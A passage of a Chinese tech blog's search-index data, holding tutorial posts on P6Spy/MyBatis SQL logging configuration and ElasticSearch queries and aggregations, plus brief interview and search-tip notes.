"全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"网络安全"},{title:"MyBatis 日志信息打印",url:"/posts/2050e9a3.html",text:'Logback 打印日志信息以下配置只会直接打印 MyBatis 的 SQL，不会自动替换 SQL 中的 ? 为真实参数值，如果需要打印完整的 SQL，请参考下面介绍的 P6Spy 使用教程。更多的 Logback 配置内容，可参考 SpringBoot2.0 整合 Logback。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- 日志级别从低到高：trace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal --&gt; &lt;!-- 日志上下文名称--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- 全局的日志级别，下面的所有配置只记录大于或等于此级别的日志信息（除了MyBatis） --&gt; &lt;property name="log.level" value="info"/&gt; &lt;!-- 日志文件的目录路径--&gt; &lt;property name="log.path" value="/var/log/spring-cloud"/&gt; &lt;!--输出到控制台--&gt; &lt;appender name="console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--此日志Filter在开发环境才启用，只配置最低级别，控制台输出的日志级别是大于或等于此级别的日志信息 --&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;${log.level}&lt;/level&gt; &lt;/filter&gt; &lt;!-- 日志输出格式 --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--输出到文件--&gt; &lt;appender name="file" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径 --&gt; &lt;file&gt;${log.path}/${log.level}.log&lt;/file&gt; &lt;!-- 日志输出格式 --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;!-- 控制日志文件只记录大于或等于此级别的日志信息 --&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;${log.level}&lt;/level&gt; &lt;/filter&gt; &lt;!-- 日志滚动策略 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;!-- 日志归档 --&gt; &lt;fileNamePattern&gt;${log.path}/${log.level}/${log.level}-%d{yyyy-MM-dd}.%i.log.gz&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;100MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;!-- 指定最基础的日志输出级别 --&gt; &lt;root level="${log.level}"&gt; &lt;appender-ref ref="console"/&gt; &lt;appender-ref ref="file"/&gt; &lt;/root&gt; &lt;!--将MyBatis的日志信息输出到控制台--&gt; &lt;appender name="mybatis_console" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;/filter&gt; &lt;!-- 日志输出格式 --&gt; &lt;encoder&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %contextName [%thread] %-5level %logger{36}.%M\\(%line\\) - %msg%n &lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 打印MyBatis的日志信息，开发环境才启用 --&gt; &lt;logger name="com.springcloud.demo.dao" level="debug" additivity="false"&gt; &lt;appender-ref ref="mybatis_console"/&gt; &lt;/logger&gt;&lt;/configuration&gt; P6Spy 打印 MyBatis 日志引入 Maven 依赖12345&lt;dependency&gt; &lt;groupId&gt;p6spy&lt;/groupId&gt; &lt;artifactId&gt;p6spy&lt;/artifactId&gt; &lt;version&gt;3.9.1&lt;/version&gt;&lt;/dependency&gt; 数据库连接配置以下內容是在 SpringBoot 2.0 的 application.yml 文件中配置，主要的配置内容是指定 driver-class-name、jdbc-url。 123456789101112131415161718192021spring: datasource: username: root password: 123456 driver-class-name: com.p6spy.engine.spy.P6SpyDriver type: com.alibaba.druid.pool.DruidDataSource filters: stat initialSize: 100 maxActive: 1000 maxOpenPreparedStatements: 20 maxWait: 60000 minEvictableIdleTimeMillis: 300000 minIdle: 500 poolPreparedStatements: true testOnBorrow: false testOnReturn: false testWhileIdle: true validationQuery: select \'x\' timeBetweenEvictionRunsMillis: 60000 url: jdbc:p6spy:mysql://127.0.0.1:3306/spring_cloud?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai ... 提示 driver-class-name 为 P6Spy 提供的驱动类 url 前缀为 jdbc:p6spy，后面跟着冒号为对应数据库的连接地址 创建 P6Spy 配置文件在项目的 src/main/resources 目录下创建 spy.properties 配置文件（如下），主要的配置内容为数据库驱动、日期格式化、单行或多行打印，日志输出方式（控制台、日志文件等）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246################################################################## P6Spy Options File ## See documentation for detailed instructions ## http://p6spy.github.io/p6spy/2.0/configandusage.html #################################################################################################################################### MODULES ## ## Module list adapts the modular functionality of P6Spy. ## Only modules listed are active. ## (default is com.p6spy.engine.logging.P6LogFactory and ## com.p6spy.engine.spy.P6SpyFactory) ## Please note that the core module (P6SpyFactory) can\'t be ## deactivated. ## Unlike the other properties, activation of the changes on ## this one requires reload. ###################################################################modulelist=com.p6spy.engine.spy.P6SpyFactory,com.p6spy.engine.logging.P6LogFactory,com.p6spy.engine.outage.P6OutageFactory################################################################# CORE (P6SPY) PROPERTIES ################################################################## A comma separated list of JDBC drivers to load and register.# (default is empty)## Note: This is normally only needed when using P6Spy in an# application server environment with a JNDI data source or when# using a JDBC driver that does not implement the JDBC 4.0 API# (specifically automatic registration).driverlist=com.mysql.jdbc.Driver# for flushing per statement# (default is false)#autoflush = false# sets the date format using Java\'s SimpleDateFormat routine.# In case property is not set, milliseconds since 1.1.1970 (unix time) is used (default is empty)dateformat=yyyy-MM-dd HH:mm:ss.SSS# prints a stack trace for every statement logged#stacktrace=false# if stacktrace=true, specifies the stack trace to print#stacktraceclass=# determines if property file should be reloaded# Please note: reload means forgetting all the previously set# settings (even those set during runtime - via JMX)# and starting with the clean table# (default is false)#reloadproperties=false# determines how often should be reloaded in seconds# (default is 60)#reloadpropertiesinterval=60# specifies the appender to use for logging# Please note: reload means forgetting all the previously set# settings (even those set during runtime - via JMX)# and starting with the clean table# (only the properties read from the configuration file)# (default is com.p6spy.engine.spy.appender.FileLogger)#appender=com.p6spy.engine.spy.appender.Slf4JLoggerappender=com.p6spy.engine.spy.appender.StdoutLogger#appender=com.p6spy.engine.spy.appender.FileLogger# name of logfile to use, note Windows users should make sure to use forward slashes in their pathname (e:/test/spy.log)# (used for com.p6spy.engine.spy.appender.FileLogger only)# (default is spy.log)#logfile=/var/log/spy.log# append to the p6spy log file. if this is set to false the# log file is truncated every time. (file logger only)# (default is true)#append=true# class to use for formatting log messages (default is: com.p6spy.engine.spy.appender.SingleLineFormat)logMessageFormat=com.p6spy.engine.spy.appender.MultiLineFormat# Custom log message format used ONLY IF logMessageFormat is set to com.p6spy.engine.spy.appender.CustomLineFormat# default is %(currentTime)|%(executionTime)|%(category)|connection%(connectionId)|%(sqlSingleLine)# Available placeholders are:# %(connectionId) the id of the connection# %(currentTime) the current time expressing in milliseconds# %(executionTime) the time in milliseconds that the operation took to complete# %(category) the category of the operation# %(effectiveSql) the SQL statement as submitted to the driver# %(effectiveSqlSingleLine) the SQL statement as submitted to the driver, with all new lines removed# %(sql) the SQL statement with all bind variables replaced with actual values# %(sqlSingleLine) the SQL statement with all bind variables replaced with actual values, with all new lines removed#customLogMessageFormat=%(currentTime)|%(executionTime)|%(category)|connection%(connectionId)|%(sqlSingleLine)# format that is used for logging of the java.util.Date implementations (has to be compatible with java.text.SimpleDateFormat)# (default is yyyy-MM-dd\'T\'HH:mm:ss.SSSZ)#databaseDialectDateFormat=yyyy-MM-dd\'T\'HH:mm:ss.SSSZ# format that is used for logging of the java.sql.Timestamp implementations (has to be compatible with java.text.SimpleDateFormat)# (default is yyyy-MM-dd\'T\'HH:mm:ss.SSSZ)#databaseDialectTimestampFormat=yyyy-MM-dd\'T\'HH:mm:ss.SSSZ# format that is used for logging booleans, possible values: boolean, numeric# (default is boolean)#databaseDialectBooleanFormat=boolean# whether to expose options via JMX or not# (default is true)#jmx=true# if exposing options via jmx (see option: jmx), what should be the prefix used?# jmx naming pattern constructed is: com.p6spy(.&lt;jmxPrefix&gt;)?:name=&lt;optionsClassName&gt;# please note, if there is already such a name in use it would be unregistered first (the last registered wins)# (default is none)#jmxPrefix=# if set to true, the execution time will be measured in nanoseconds as opposed to milliseconds# (default is false)#useNanoTime=false################################################################## DataSource replacement ## ## Replace the real DataSource class in your application server ## configuration with the name com.p6spy.engine.spy.P6DataSource ## (that provides also connection pooling and xa support). ## then add the JNDI name and class name of the real ## DataSource here ## ## Values set in this item cannot be reloaded using the ## reloadproperties variable. Once it is loaded, it remains ## in memory until the application is restarted. ## ###################################################################realdatasource=/RealMySqlDS#realdatasourceclass=com.mysql.jdbc.jdbc2.optional.MysqlDataSource################################################################## DataSource properties ## ## If you are using the DataSource support to intercept calls ## to a DataSource that requires properties for proper setup, ## define those properties here. Use name value pairs, separate ## the name and value with a semicolon, and separate the ## pairs with commas. ## ## The example shown here is for mysql ## ###################################################################realdatasourceproperties=port;3306,serverName;myhost,databaseName;jbossdb,foo;bar################################################################## JNDI DataSource lookup ## ## If you are using the DataSource support outside of an app ## server, you will probably need to define the JNDI Context ## environment. ## ## If the P6Spy code will be executing inside an app server then ## do not use these properties, and the DataSource lookup will ## use the naming context defined by the app server. ## ## The two standard elements of the naming environment are ## jndicontextfactory and jndicontextproviderurl. If you need ## additional elements, use the jndicontextcustom property. ## You can define multiple properties in jndicontextcustom, ## in name value pairs. Separate the name and value with a ## semicolon, and separate the pairs with commas. ## ## The example shown here is for a standalone program running on ## a machine that is also running JBoss, so the JNDI context ## is configured for JBoss (3.0.4). ## ## (by default all these are empty) ###################################################################jndicontextfactory=org.jnp.interfaces.NamingContextFactory#jndicontextproviderurl=localhost:1099#jndicontextcustom=java.naming.factory.url.pkgs;org.jboss.naming:org.jnp.interfaces#jndicontextfactory=com.ibm.websphere.naming.WsnInitialContextFactory#jndicontextproviderurl=iiop://localhost:900################################################################# P6 LOGGING SPECIFIC PROPERTIES ################################################################## filter what is logged# please note this is a precondition for usage of: include/exclude/sqlexpression# (default is false)#filter=false# comma separated list of strings to include# please note that special characters escaping (used in java) has to be done for the provided regular expression# (default is empty)#include=# comma separated list of strings to exclude# (default is empty)#exclude=# sql expression to evaluate if using regex# please note that special characters escaping (used in java) has to be done for the provided regular expression# (default is empty)#sqlexpression=#list of categories to exclude: error, info, batch, debug, statement,#commit, rollback, result and resultset are valid values# (default is info,debug,result,resultset,batch)#excludecategories=info,debug,result,resultset,batch#whether the binary values (passed to DB or retrieved ones) should be logged with placeholder: [binary] or not.# (default is false)#excludebinary=false# Execution threshold applies to the standard logging of P6Spy.# While the standard logging logs out every statement# regardless of its execution time, this feature puts a time# condition on that logging. Only statements that have taken# longer than the time specified (in milliseconds) will be# logged. This way it is possible to see only statements that# have exceeded some high water mark.# This time is reloadable.## executionThreshold=integer time (milliseconds)# (default is 0)#executionThreshold=################################################################# P6 OUTAGE SPECIFIC PROPERTIES ################################################################## Outage Detection## This feature detects long-running statements that may be indicative of# a database outage problem. If this feature is turned on, it will log any# statement that surpasses the configurable time boundary during its execution.# When this feature is enabled, no other statements are logged except the long# running statements. The interval property is the boundary time set in seconds.# For example, if this is set to 2, then any statement requiring at least 2# seconds will be logged. Note that the same statement will continue to be logged# for as long as it executes. So if the interval is set to 2, and the query takes# 11 seconds, it will be logged 5 times (at the 2, 4, 6, 8, 10 second intervals).## outagedetection=true|false# outagedetectioninterval=integer time (seconds)## (default is false)#outagedetection=false# (default is 60)#outagedetectioninterval=30 日志打印结果简单执行 CRUD 操作后，P6Spy 打印的日志信息如下： 12345678==&gt; Preparing: SELECT id,email,last_name,gender,age FROM t_employee WHERE id=?==&gt; Parameters: 1(Long) Consume Time：2 ms 2022-09-17 19:38:30 Execute SQL：SELECT id,email,last_name,gender,age FROM t_employee WHERE id=1 &lt;== Columns: id, email, last_name, gender, age&lt;== Row: 1, empty@gmai.com, Clion, 1, 26&lt;== Total: 1 可以发现 P6Spy 组件会打印出完整的 SQL 语句和执行 SQL 语句所耗费的时间，而且它会自动替换 SQL 中的 ? 为真实参数值并输出。 P6Spy 打印 MyBatis-Plus 日志 MyBatis-Plus 执行 SQL 分析打印 参考博客 P6Spy Github P6Spy Installation P6Spy Configuration and Usage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"ElasticSearch 入门教程 - 基础篇之二",url:"/posts/e049279f.html",text:'大纲 ElasticSearch 入门教程 - 基础篇之一 ElasticSearch 入门教程 - 基础篇之二 ElasticSearch 入门教程 - 基础篇之三 版本说明 软件 版本 描述 ElasticSearch 7.4.2 ElasticSearch 的版本 Curl 7.29.0 Curl 的版本 ElasticSearch 导入数据学习 ES 的时候，往往需要大量的测试数据，建议导入 ES 官方 GitHub 仓库中的 JSON 数据文件，这样方便后续学习 ES 的复杂查询。首先将 ES 官方提供的 JSON 数据保存到 accounts.json 文件里，或者直接从本站下载 数据文件，然后执行以下命令批量导入数据。 1curl -X POST -H \'Content-Type:application/json\' http://127.0.0.1:9200/bank/account/_bulk --data-binary @accounts.json ElasticSearch 检索操作Search API 的使用ES 支持下述两种基本的检索方式，分别是 URI + 检索参数 与 URI + 请求体。 第一种使用方式使用 REST Request URI 发送检索参数（URI + 检索参数）。 检索示例 描述 GET bank/_search 检索 bank 索引下的所有信息，包括 type 和 docs GET bank/_search?q=*&amp;sort=account_number:asc 请求参数方式检索 12# 查询 bank 索引下的所有数据，并按照 account_number 字段升序排序curl -X GET -H \'Content-Type:application/json\' http://127.0.0.1:9200/bank/_search?q=*&amp;sort=account_number:asc 第二种使用方式使用 REST Request Body 来发送检索参数（URI + 请求体）。 12# 查询 bank 索引下的所有数据，并按照 account_number 字段升序排序curl -X POST -H \'Content-Type:application/json\' http://127.0.0.1:9200/bank/_search -d \'{"query":{"match_all":{}},"sort":[{"account_number":{"order":"asc"}}]}\' 上述的 Curl 命令，POST 了一个 JSON 风格的查询请求体到 Search API，请求体的内容就是 Query DSL。值得一提的是，一旦搜索的结果被返回，Elasticsearch 就完成了这次请求，并且不会维护任何服务端的资源或者结果的 Cursor（游标）。 返回结果的说明 返回结果的字段 描述 took 执行搜索的耗时（毫秒） time_out 搜索是否超时 _shards 多少个分片被搜索了，以及统计了成功 / 失败的搜索分片 hits 搜索结果 hits.total 搜索结果统计 hits.hits 实际的搜索结果数组（默认只搜索前 10 条文档） hits.sort 结果的排序 Key（键），没有则按 score 排序 hits.score 相关性得分（全文检索用） max_score 相关性的最高得分（全文检索用） Query DSL 的使用Elasticsearch 提供了一个可以执行查询的 Json 风格的 DSL（Domain Specific Language - 领域特定语言），这个被称为 Query DSL。该查询语言非常全面，虽然刚开始使用的时候感觉有点复杂，但熟悉了之后会发现很实用。 语法格式 一个查询语句的典型结构 1234567{ QUERY_NAME: { ARGUMENT: VALUE, ARGUMENT: VALUE, ... }} 如果是针对某个字段查询，那么它的结构如下 123456789{ QUERY_NAME: { FIELD_NAME: { ARGUMENT: VALUE, ARGUMENT: VALUE, ... } }} 简单查询 查询前 5 条记录，并按照 account_number 字段倒序排序 123456789101112131415GET /bank/_search{ "query": { "match_all": {} }, "from": 0, "size": 5, "sort": [ { "account_number": { "order": "desc" } } ]} 参数名称 描述 query 定义如何查询 match_all 查询类型，代表查询所有的所有，ES 可以在 query 中组合非常多的查询类型以完成复杂查询 from 完成分页查询功能 size 完成分页查询功能 sort 排序，多字段排序，会在前序字段相等时使用后续字段排序，否则以前序为准 返回部分字段 查询前 5 条记录，并只返回 age 与 balance 字段。 123456789101112GET /bank/_search{ "query": { "match_all": {} }, "from": 0, "size": 5, "_source": [ "age", "balance" ]} match 匹配查询提示 使用 match 匹配字符串类型字段的时候，ES 会进行全文检索，并且每条记录都有相关性得分。 ES 进行全文检索时，底层使用的是倒排索引（Inverted Index）。 基本类型（非字符串），精确匹配。查询 account_number 是 20 的所有记录。 12345678GET /bank/_search{ "query": { "match": { "account_number": 20 } }} 字符串类型，精确匹配（使用 keyword 关键字）。查询出 address 是 990 Mill Road 的所有记录，并给出相关性得分。 12345678GET /bank/_search{ "query": { "match": { "address.keyword": "990 Mill Road" } }} 字符串类型，单个单词（全文检索）。查询出 address 字段中包含 mill 单词的所有记录，并给出相关性得分。 12345678GET /bank/_search{ "query": { "match": { "address": "mill" } }} 字符串类型，多个单词（分词 + 全文检索）。查询出 address 字段中包含 mill 或者 road 或者 mill road 的所有记录，并给出相关性得分。 12345678GET /bank/_search{ "query": { "match": { "address": "mill road" } }} match_phrase 短语匹配将需要匹配的值当成一个整体单词（不分词）进行检索 12345678GET /bank/_search{ "query": { "match_phrase": { "address": "mill road" } }} 查出 address 字段中包含 mill road 的所有记录，不进行分词处理，并给出相关性得分。 multi_match 多字段匹配123456789101112GET /bank/_search{ "query": { "multi_match": { "fields": [ "state", "address" ], "query": "mill" } }} 查出 state 或者 address 字段中包含 mill 的所有记录。如果匹配的是包含多个单词的字符串（例如 mill road），会进行分词处理，并给出相关性得分。 bool 复合查询bool 用来做复合查询。复合语句可以合并任何其它查询语句，包括复合语句，了解这一点是很重要的。这就意味着，复合语句之间可以互相嵌套，可以表达非常复杂的逻辑。 类型 描述 must 子句 (查询) 必须出现在匹配的文档中，并将有助于得分。 filter 子句 (查询) 必须出现在匹配的文档中。然而，与 must 不同的是，查询的分数将被忽略。过滤器子句在过滤器上下文中执行，这意味着评分被忽略，子句被考虑用于缓存。 should 子句 (查询) 应该出现在匹配的文档中。在 bool 查询中不包含 must 或者 filter 子句时，一个或多个 should 子句必须有相匹配的文档。 must_not 子句 (查询) 不能出现在匹配的文档中。子句在过滤器上下文中执行，这意味着评分被忽略，子句被考虑用于缓存。因为评分会被忽略，所以会返回所有文档的评分为 0。 must 复合查询must 复合查询，表示必须满足列举的所有条件 12345678910111213141516171819GET /bank/_search{ "query": { "bool": { "must": [ { "match": { "address": "mill" } }, { "match": { "gender": "M" } } ] } }} should 复合查询should 复合查询，表示应该满足列举的条件。如果满足会增加相关性的评分，但不会改变查询的结果。如果 query 中只有 should 且只有一种匹配规则，那么 should 的条件就会被作为默认匹配条件而去改变查询结果。 1234567891011121314151617181920212223242526GET /bank/_search{ "query": { "bool": { "must": [ { "match": { "address": "mill" } }, { "match": { "gender": "M" } } ], "should": [ { "match": { "address": "lane" } } ] } }} must_not 复合查询must_not 复合查询，表示必须不满足列出的所有条件。 123456789101112131415161718192021222324252627282930313233GET /bank/_search{ "query": { "bool": { "must": [ { "match": { "address": "mill" } }, { "match": { "gender": "M" } } ], "should": [ { "match": { "address": "lane" } } ], "must_not": [ { "match": { "email": "baluba.com" } } ] } }} filter 复合查询filter 复合查询，作用与 must 一样，可用于查询结果过滤。除此之外，filter 还可以用于忽略相关性得分。 filter 可以与 must、should、must_not 复合查询一起使用，此时的作用是查询结果过滤，会产生相关性得分。 12345678910111213141516171819202122GET /bank/_search{ "query": { "bool": { "must": [ { "match": { "address": "mill" } } ], "filter": { "range": { "balance": { "gte": 10000, "lte": 20000 } } } } }} filter 单独使用时，查询结果中不会产生相关性得分。值得一提的是，并不是所有的查询都需要产生相关性得分，特别是那些仅用于 filtering（过滤） 的文档。为了不计算得分，ES 会自动检查场景并且优化查询的执行。 123456789101112131415GET /bank/_search{ "query": { "bool": { "filter": { "range": { "balance": { "gte": 10000, "lte": 20000 } } } } }} term 匹配查询term 的作用和 match 一样，用于匹配某个字段的值。全文检索字段（字符串类型）用 match，其他非字符串类型字段的匹配用 term。 12345678GET /bank/_search{ "query": { "term": { "account_number": 20 } }} term 可以结合 bool 复合查询一起使用 123456789101112131415161718192021GET /bank/_search{ "query": { "bool": { "must": [ { "term": { "age": { "value": 28 } } }, { "match": { "address": "990 Mill Road" } } ] } }} aggregations 聚合查询聚合查询提供了从数据中分组和提取数据的能力，最简单的聚合方法大致等于 SQL GROUP BY 和 SQL 聚合函数。在 ES 中，有执行搜索返回 hits（命中结果），并且同时返回聚合结果，把一个响应中的所有 hits（命中结果）分隔开的能力。这是非常强大且有效的，可以执行查询和多个聚合，并且在一次使用中得到各自的（任何一个的）返回结果，使用一次简洁和简化的 API 来避免网络往返。 执行聚合查询的语法如下 1234567"aggs": { "aggs_name": { // aggs_name - 聚合的名称，方便展示在结果集中 "agg_type": { // agg_type - 聚合的类型（avg、terms、max、min、sum 等等） } }} 使用案例一查询 address 中包含 mill 的所有人的年龄分布以及平均年龄，但不显示这些人的详情。 提示 下述 Query DSL 中的 size：0，表示不显示查询结果的数据，只显示聚合结果。 123456789101112131415161718192021GET /bank/_search{ "query": { "match": { "address": "mill" } }, "aggs": { "group_by_age": { "terms": { "field": "age" } }, "avg_age": { "avg": { "field": "age" } } }, "size": 0} 返回的聚合查询结果如下： 1234567891011121314151617181920212223242526272829303132333435363738394041{ "took": 1, "timed_out": false, "_shards": { "total": 1, "successful": 1, "skipped": 0, "failed": 0 }, "hits": { "total": { "value": 4, "relation": "eq" }, "max_score": null, "hits": [] }, "aggregations": { "avg_age": { "value": 34.0 }, "group_by_age": { "doc_count_error_upper_bound": 0, "sum_other_doc_count": 0, "buckets": [ { "key": 38, "doc_count": 2 }, { "key": 28, "doc_count": 1 }, { "key": 32, "doc_count": 1 } ] } }} 使用案例二查出所有年龄的分布，并且获取这些年龄段的这些人的平均薪资。 12345678910111213141516171819202122GET /bank/_search{ "query": { "match_all": {} }, "aggs": { "age_avg": { "terms": { "field": "age", "size": 1000 }, "aggs": { "avg_banlance": { "avg": { "field": "balance" } } } } }, "size": 1000} 使用案例三查出所有年龄的分布，并且获取这些年龄段中男性与女性的平均薪资，以及这些年龄段的这些人的平均薪资。 1234567891011121314151617181920212223242526272829303132333435GET /bank/_search{ "query": { "match_all": {} }, "aggs": { "age_agg": { "terms": { "field": "age", "size": 100 }, "aggs": { "gender_agg": { "terms": { "field": "gender.keyword", "size": 100 }, "aggs": { "avg_banlance": { "avg": { "field": "balance" } } } }, "avg_banlance": { "avg": { "field": "balance" } } } } }, "size": 1000} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"分布式技术面试题之一",url:"/posts/c61757ff.html",text:'单点登录流程 购物车实现流程购物车与用户的关系： 一个用户必须对应一个购物车（用户不管购买多少商品，都会存放在属于自己的购物车中） 购物车相关的操作有哪些： 添加购物车 用户未登录状态 购物车数据添加到什么地方？ 1）Reids 2）Cookie，若浏览器禁用了 Cookie，可以存储在浏览器的 Local Storage 用户已登录状态 购物车数据添加到什么地方？ 1）Reids 2）数据库 3）Redis + 数据库 展示购物车 用户未登录状态 直接从 Redis 或者 Cookie 中取得数据来展示 用户已登录状态 必须显示数据库 + Redis + Cookie 中的全部购物车数据 Redis 中使用的数据类型为散列（Hash），KEY 为 user:userId:cart，通过 Hset(key, productId, value) 来添加用户的购物车数据。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"互联网搜索技巧",url:"/posts/c357af28.html",text:'GitHub 搜索搜索电子书关键词搜索示例： pdf cs-books cs books awesome cs books 搜索特定内容使用关键字 awesome + xxxx，例如搜索 Java 相关且最有价值（最多 Star）的项目，可以使用关键字 awesome java 进行搜索。关键词搜索示例： awesome c++ awesome java awesome spider awesome HarmonyOS Google 搜索搜索电子书使用 关键词 + filetype:pdf 进行搜索，关键词搜索示例： Java 8 实战 filetype:pdf C++ Primer Plus filetype:pdf var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开源项目 开发随笔"},{title:"ElasticSearch 入门教程 - 基础篇之一",url:"/posts/5ab118a5.html",text:'大纲 ElasticSearch 入门教程 - 基础篇之一 ElasticSearch 入门教程 - 基础篇之二 ElasticSearch 入门教程 - 基础篇之三 版本说明 软件 版本 描述 ElasticSearch 7.4.2 ElasticSearch 的版本 Curl 7.29.0 Curl 的版本 ElasticSearch 介绍ElasticSearch 概述ElasticSearch 是基于 RESTful 标准的高扩展高可用的实时数据分析的全文搜索工具。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful 接口。ElasticSearch 是在 Lucene 的基础上用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch 在云计算中，拥有实时搜索、稳定、可靠、快速、安装使用方便等优势。构建在全文检索开源软件 Lucene 之上的 Elasticsearch，不仅能对海量规模的数据完成分布式索引与检索，还能提供数据聚合分析的功能。 ElasticSearch 基础概念 Index - 类似于 MySQL 数据库中的 database Type - 类似于 MySQL 数据库中的 table，ES 中可以在 Index 中建立 Type，通过 Mapping 进行映射 Document - 由于 ES 存储的数据是文档类型的，一条数据对应一个文档，相当于 MySQL 数据库中的一行数据 row Field - ES 中一个文档中可以有多个字段，相当于 MySQL 数据库一行可以有多列 Mapping - 可以理解为 MySQL 或者 Solr 中对应的 schema，只不过有些时候 ES 中的 Mapping 增加了动态识别功能，实际生产环境上不建议使用，最好还是开始就制定好了对应的 schema Indexed - 名义上的索引建立，MySQL 中一般会对经常使用的列增加相应的索引用于提高查询速度，而在 ES 中默认都是会加上索引的，除非特殊制定不建立索引只是进行存储用于展示，这个需要根据具体的需求和业务进行设定 Query DSL - 类似于 MySQL 的 SQL 语句，只不过在 ES 中是使用的 JSON 格式的查询语句，即 QueryDSL 值得一提的是，从 ES 7 及以上版本开始，Type 的概念已经被官方移除。 提示 ElasticSearch 的官网可以 点击这里 查看。 Elasticsearch 的基础概念图可以 点击这里 查看。 ElasticSearch 基本架构 Gateway 层：ES 用来存储索引文件的一个文件系统且它支持很多类型，例如：本地磁盘、共享存储（做 Snapshot 的时候需要用到）、Hadoop 的 HDFS 分布式存储、亚马逊的 S3。它的主要职责是用来对数据进行长持久化以及整个集群重启之后可以通过 